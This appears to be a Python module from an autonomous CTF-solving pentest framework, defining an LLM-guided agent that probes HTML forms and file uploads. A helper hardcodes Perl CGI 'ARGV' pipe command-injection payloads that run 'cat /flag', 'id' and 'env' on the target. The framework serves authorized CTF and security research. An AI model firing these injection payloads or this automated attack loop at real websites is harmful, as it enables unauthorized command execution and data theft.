"""Generic HTML form interaction worker."""

from __future__ import annotations

import json
from urllib.parse import urlparse

from nyuctf_mutil_killchain.agents.base import (
    WorkerAgent,
    build_exploit_hypothesis_task,
    build_flag_validation_tasks,
    build_web_form_probe_task,
    merge_unique_strings,
)
from nyuctf_mutil_killchain.agents.llm_guidance import FormProbeGuidance
from nyuctf_mutil_killchain.state import GlobalState, Task, WorkerReport
from nyuctf_mutil_killchain.tools import ToolExecutionError, ToolExecutionRequest


def _script_like_upload_query_variants(page_url: str, forms: list[dict[str, object]]) -> list[str]:
    """Return generic CGI/script upload query variants for suspicious file-input forms."""

    path = urlparse(page_url).path.lower()
    looks_like_script = (
        "cgi-bin" in path
        or path.endswith((".cgi", ".pl", ".php", ".asp", ".aspx", ".jsp"))
    )
    if not looks_like_script:
        return []

    file_field_names: list[str] = []
    for form in forms:
        for field in list(form.get("inputs") or []):
            if not isinstance(field, dict):
                continue
            field_type = str(field.get("type") or "").strip().lower()
            field_name = str(field.get("name") or "").strip()
            if field_type == "file" and field_name and field_name not in file_field_names:
                file_field_names.append(field_name)

    if not file_field_names:
        return []

    variants: list[str] = []
    for field_name in file_field_names[:2]:
        candidates = [
            f"{field_name}=ARGV",
            f"{field_name}=STDIN",
            f"{field_name}=%2Fdev%2Ffd%2F0",
            f"{field_name}=ARGV&cat%20%2Fflag%20%7C",
            f"{field_name}=ARGV&cat%20%2Fflag*%20%7C",
            f"{field_name}=ARGV&id%20%7C",
            f"{field_name}=ARGV&env%20%7C",
        ]
        for candidate in candidates:
            if candidate not in variants:
                variants.append(candidate)
    return variants[:8]


def _supports_stateful_form_replay(forms: list[dict[str, object]]) -> bool:
    """Return whether the discovered forms are worth replaying against derived action URLs."""

    for form in forms:
        method = str(form.get("method") or "get").strip().lower()
        if method and method != "get":
            return True
        for field in list(form.get("inputs") or []):
            if not isinstance(field, dict):
                continue
            if str(field.get("type") or "").strip().lower() == "file":
                return True
    return False


def _candidate_replay_urls(
    page_url: str,
    forms: list[dict[str, object]],
    output_context: dict[str, object],
) -> list[str]:
    """Select same-origin derived URLs that deserve a direct form replay."""

    if not _supports_stateful_form_replay(forms):
        return []

    page_parts = urlparse(page_url)
    replay_urls: list[str] = []
    for candidate in merge_unique_strings(
        output_context.get("interesting_paths") or [],
        output_context.get("action_urls") or [],
        limit=12,
    ):
        text = str(candidate).strip()
        if not text or text == page_url:
            continue
        parsed = urlparse(text)
        if parsed.scheme and page_parts.scheme and parsed.scheme != page_parts.scheme:
            continue
        if parsed.netloc and page_parts.netloc and parsed.netloc != page_parts.netloc:
            continue
        if text not in replay_urls:
            replay_urls.append(text)
        if len(replay_urls) >= 3:
            break
    return replay_urls


class WebFormProbeAgent(WorkerAgent):
    """Interacts with discovered HTML forms using generic submissions and uploads."""

    name = "web-form-probe-agent"
    supported_task_types = ("web.form_probe",)
    routing_summary = "General HTML form interaction, multipart upload probing, and reflective workflow analysis."
    preferred_challenge_categories = ("web", "misc")
    required_context_keys = ("asset_id", "page_url", "forms")

    def run(self, task: Task, state: GlobalState) -> WorkerReport:
        asset_id = str(task.input_context.get("asset_id") or "")
        page_url = str(task.input_context.get("page_url") or "")
        forms = [
            form
            for form in list(task.input_context.get("forms") or [])
            if isinstance(form, dict)
        ]
        if not asset_id or not page_url or not forms:
            return WorkerReport(
                task_id=task.task_id,
                worker_name=self.name,
                success=False,
                summary="Web form probe task is missing required form context.",
                error="asset_id, page_url, and forms are required in task.input_context",
                retryable=False,
            )
        if self.execution_plane is None:
            return WorkerReport(
                task_id=task.task_id,
                worker_name=self.name,
                success=False,
                summary="Web form probing requires an execution plane; none is configured.",
                error="WebFormProbeAgent.execution_plane is None",
                retryable=False,
            )

        worker_notes: list[str] = []
        llm_guidance = self.generate_structured_output(
            system_prompt=(
                "You plan generic web-form interaction for an authorized CTF workflow. "
                "Return only JSON matching the FormProbeGuidance schema. "
                "Prefer grounded query variants, filenames, and text payloads that test how the target handles "
                "uploaded filenames, reflected fields, multipart parsing, and unsafe server-side interpretation. "
                "Do not invent credentials or unrelated endpoints."
            ),
            user_prompt=json.dumps(
                {
                    "objective": state.objective,
                    "task_id": task.task_id,
                    "challenge": state.metadata.get("challenge", {}),
                    "page_url": page_url,
                    "forms": forms,
                    "recent_findings": [
                        finding.model_dump(mode="json")
                        for finding in list(state.findings.values())[-10:]
                    ],
                    "recent_notes": state.notes[-8:],
                },
                ensure_ascii=True,
                indent=2,
            ),
            schema=FormProbeGuidance,
        )

        text_payloads = merge_unique_strings(
            ["autopentest-canary"],
            llm_guidance.text_payloads,
            limit=4,
        )
        filename_variants = merge_unique_strings(
            ["autopentest.txt"],
            llm_guidance.filename_variants,
            limit=4,
        )
        llm_query_variants = merge_unique_strings(
            llm_guidance.query_variants,
            limit=8,
        )
        query_variants = llm_query_variants or _script_like_upload_query_variants(page_url, forms)

        request = ToolExecutionRequest(
            tool_name="http_form_probe",
            parser_name="jsonl_signals",
            timeout_s=task.input_context.get("timeout_s", 45),
            metadata={
                "asset_id": asset_id,
                "page_url": page_url,
                "forms": forms,
                "text_payloads": text_payloads,
                "filename_variants": filename_variants,
                "query_variants": query_variants,
            },
        )
        try:
            bundle = self.execution_plane.execute(task.task_id, request)
        except ToolExecutionError as exc:
            return WorkerReport(
                task_id=task.task_id,
                worker_name=self.name,
                success=False,
                summary="Web form probe execution failed.",
                error=str(exc),
            )

        output_context = dict(bundle.parsed.output_context)
        flag_candidates = list(output_context.get("flag_candidates") or [])
        flag_candidates = merge_unique_strings(
            flag_candidates,
            llm_guidance.grounded_flag_candidates,
            limit=12,
        )
        output_context["llm_summary"] = llm_guidance.summary
        output_context["manual_checks"] = merge_unique_strings(
            output_context.get("manual_checks") or [],
            llm_guidance.manual_checks,
            limit=10,
        )

        new_tasks = build_flag_validation_tasks(
            flag_candidates, source="http_form_probe"
        )
        replay_urls = _candidate_replay_urls(page_url, forms, output_context)
        new_tasks.extend(
            build_web_form_probe_task(
                asset_id=asset_id,
                page_url=replay_url,
                forms=forms,
                priority=80,
            )
            for replay_url in replay_urls
        )
        has_meaningful_signal = bool(output_context.get("submission_results")) and bool(
            output_context.get("reflected_markers")
            or output_context.get("reflected_filenames")
            or output_context.get("interesting_paths")
        )
        should_schedule_reasoning = has_meaningful_signal
        if should_schedule_reasoning:
            seed_terms = merge_unique_strings(
                [page_url],
                output_context.get("interesting_paths") or [],
                output_context.get("action_urls") or [],
                output_context.get("reflected_markers") or [],
                output_context.get("reflected_filenames") or [],
                query_variants,
                limit=12,
            )
            new_tasks.append(
                build_exploit_hypothesis_task(
                    focus_asset_ids=[asset_id],
                    seed_terms=seed_terms,
                    priority=79,
                )
            )

        output_context["flag_candidates"] = flag_candidates
        output_context["text_payloads"] = text_payloads
        output_context["filename_variants"] = filename_variants
        output_context["query_variants"] = query_variants

        return WorkerReport(
            task_id=task.task_id,
            worker_name=self.name,
            success=True,
            summary=bundle.parsed.summary,
            output_context=output_context,
            asset_updates=bundle.parsed.asset_updates,
            finding_updates=bundle.parsed.finding_updates,
            credential_updates=bundle.parsed.credential_updates,
            network_updates=bundle.parsed.network_updates,
            evidence_updates=[bundle.evidence],
            new_tasks=new_tasks,
            notes=worker_notes + bundle.parsed.notes + [f"{self.name} interacted with discovered HTML forms."],
        )
